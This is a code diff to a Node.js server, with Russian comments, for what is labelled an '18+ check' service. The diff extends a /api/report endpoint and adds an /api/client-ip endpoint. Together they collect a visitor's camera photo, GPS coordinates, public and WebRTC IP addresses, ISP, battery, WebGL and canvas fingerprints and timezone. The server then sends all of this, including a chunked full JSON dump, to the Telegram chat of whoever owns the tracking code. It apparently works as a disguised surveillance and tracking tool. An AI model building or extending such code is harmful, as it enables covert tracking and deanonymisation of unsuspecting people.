@@ -95,6 +95,7 @@ function b64ToBuffer(dataUrl = '') {
   const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
   return Buffer.from(b64, 'base64');
 }
+
 async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
   if (!BOT_TOKEN) throw new Error('No BOT token on server');
   if (!chatId) throw new Error('Missing chat_id');
@@ -113,6 +114,33 @@ async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'repo
     throw new Error(`Telegram ${resp.status}: ${text}`);
   }
   return resp.json();
+}
+
+async function sendMessageToTelegram({ chatId, text, parse_mode = 'HTML' }) {
+  if (!BOT_TOKEN) throw new Error('No BOT token on server');
+  if (!chatId) throw new Error('Missing chat_id');
+
+  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const resp = await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text, parse_mode })
+  });
+  if (!resp.ok) {
+    const t = await resp.text().catch(() => '');
+    throw new Error(`Telegram ${resp.status}: ${t}`);
+  }
+  return resp.json();
+}
+
+function safeJson(obj, space = 0) {
+  try { return JSON.stringify(obj, null, space); }
+  catch { return String(obj); }
+}
+function short(str, n = 64) {
+  if (!str) return '';
+  str = String(str);
+  return str.length <= n ? str : (str.slice(0, n - 3) + '...');
 }
 
 // ==== health & debug ====
@@ -158,16 +186,50 @@ app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
   res.send(injected);
 });
 
-// ==== API: report (отправка фото владельцу кода) ====
+// ==== API: client-ip (минимум; без внешних сервисов) ====
+app.get('/api/client-ip', (req, res) => {
+  const fwd = (req.headers['x-forwarded-for'] || '').toString().split(',')[0].trim();
+  const ip  = fwd || req.ip || null;
+  const country =
+    req.headers['cf-ipcountry'] ||
+    req.headers['x-vercel-ip-country'] ||
+    req.headers['x-country-code'] || null;
+  const isp = req.headers['x-real-isp'] || null; // можно прокидывать с edge
+  res.json({ ip, country, isp, ua: req.headers['user-agent'] || null });
+});
+
+// ==== API: report (отправка фото + сводка и полный JSON) ====
 app.post('/api/report', async (req, res) => {
   try {
-    const { userAgent, platform, iosVersion, isSafari, geo, photoBase64, note, code } = req.body || {};
+    const {
+      userAgent, platform, iosVersion, isSafari,
+      geo, photoBase64, note, code,
+
+      // НОВОЕ (из фронта):
+      client_profile,   // быстрый мультисбор
+      device_check      // { score, label, reasons[], details{...}, ... }
+    } = req.body || {};
+
     if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
     if (!photoBase64) return res.status(400).json({ ok:false, error: 'No photoBase64' });
 
     const row = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?')
       .get(String(code).toUpperCase());
     if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });
+
+    // — короткая выжимка для caption (лимит у sendPhoto ~1024 символа)
+    const cp = client_profile || {};
+    const dc = device_check   || {};
+
+    const webrtcCount = Array.isArray(cp.webrtcIps) ? cp.webrtcIps.length : 0;
+    const dcWords = Array.isArray(cp.dcIspKeywords) ? cp.dcIspKeywords.join(',') : '';
+    const net = cp.network || {};
+    const bat = cp.battery || null;
+    const webgl = cp.webgl || null;
+    const canvas = cp.canvasFingerprint || null;
+    const inApp = cp.inAppWebView || {};
+    const locale = cp.locale || {};
+    const pubIP = cp.publicIp || {};
 
     const caption = [
       '<b>Новый отчёт 18+ проверка</b>',
@@ -176,16 +238,47 @@ app.post('/api/report', async (req, res) => {
       `Platform: <code>${escapeHTML(platform || '')}</code>`,
       `iOS-like: <code>${escapeHTML(iosVersion ?? '')}</code>  Safari: <code>${escapeHTML(isSafari)}</code>`,
       geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>` : 'Geo: <code>нет</code>',
+      cp.permissions ? `Perms: <code>geo=${escapeHTML(cp.permissions.geolocation||'?')} cam=${escapeHTML(cp.permissions.camera||'?')} mic=${escapeHTML(cp.permissions.microphone||'?')}</code>` : null,
+      pubIP.ip ? `IP: <code>${escapeHTML(pubIP.ip||'?')} ${escapeHTML(pubIP.country||'')}</code> ISP: <code>${escapeHTML(pubIP.isp||pubIP.org||'')}</code>` : 'IP: <code>нет</code>',
+      `WebRTC IPs: <code>${webrtcCount}</code>  DC-ISP: <code>${escapeHTML(short(dcWords, 40) || '–')}</code>`,
+      `Net: <code>${escapeHTML(String(net.effectiveType||'')).toLowerCase()||'?'}, rtt=${escapeHTML(net.rtt!=null?String(net.rtt):'?')}</code>`,
+      bat ? `Battery: <code>${bat.level}%${bat.charging? ' (chg)': ''}</code>` : null,
+      webgl ? `WebGL: <code>${escapeHTML(short(webgl.vendor,40))} | ${escapeHTML(short(webgl.renderer,40))}</code>` : null,
+      canvas ? `Canvas: <code>${escapeHTML(short(canvas.hash,18))} (${canvas.size})</code>` : null,
+      inApp?.isInApp ? `InApp: <code>${escapeHTML((inApp.any||[]).join(','))}</code>` : 'InApp: <code>нет</code>',
+      locale?.timeZone ? `TZ: <code>${escapeHTML(locale.timeZone)}</code>` : null,
+      (dc && (dc.score!=null || dc.label)) ? `Check: <code>${escapeHTML(dc.label||'?')} (${dc.score ?? '?'})</code>` : null,
       note ? `Note: <code>${escapeHTML(note)}</code>` : null
     ].filter(Boolean).join('\n');
 
+    // 1) Фото + краткая сводка
     const buf = b64ToBuffer(photoBase64);
-    const tg = await sendPhotoToTelegram({
+    const tgPhoto = await sendPhotoToTelegram({
       chatId: String(row.chat_id),
       caption,
       photoBuf: buf
     });
-    res.json({ ok: true, sent: [{ chatId: String(row.chat_id), ok: true, message_id: tg?.result?.message_id }] });
+
+    // 2) Полный JSON мультисбора и девайс-чека — отдельными сообщениями (чанки)
+    const fullJson = safeJson({
+      geo, userAgent, platform, iosVersion, isSafari,
+      client_profile: cp, device_check: dc
+    }, 2);
+
+    const CHUNK = 3500; // запас по лимиту 4096
+    for (let i = 0; i < fullJson.length; i += CHUNK) {
+      const part = fullJson.slice(i, i + CHUNK);
+      await sendMessageToTelegram({
+        chatId: String(row.chat_id),
+        text: `<b>Детали (${1 + Math.floor(i / CHUNK)})</b>\n<pre>${escapeHTML(part)}</pre>`,
+        parse_mode: 'HTML'
+      });
+    }
+
+    res.json({
+      ok: true,
+      sent: [{ chatId: String(row.chat_id), ok: true, message_id: tgPhoto?.result?.message_id }]
+    });
   } catch (e) {
     console.error('[report] error:', e);
     res.status(500).json({ ok: false, error: e.message || 'Internal error' });
